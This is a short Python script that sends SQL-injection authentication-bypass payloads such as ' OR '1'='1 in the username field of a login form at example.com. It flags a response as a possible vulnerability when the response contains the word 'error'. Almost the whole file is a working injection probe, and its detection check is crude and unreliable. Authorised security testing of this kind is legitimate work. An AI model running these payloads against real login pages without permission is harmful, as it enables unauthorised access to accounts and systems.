import requests

# List of payloads to test for SQL injection
payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "' OR '1'='1'; --"]

# Target URL
url = 'http://example.com/login'

def send_request(payload):
    # Insert the payload into the data
    data = {'username': payload, 'password': 'password'}
    response = requests.post(url, data=data)
    
    return response

def main():
    for payload in payloads:
        response = send_request(payload)

        # Check if the response contains an error message
        if 'error' in response.text.lower():
            print(f"Possible SQL Injection vulnerability detected with payload: {payload}")

if __name__ == "__main__":
    main()
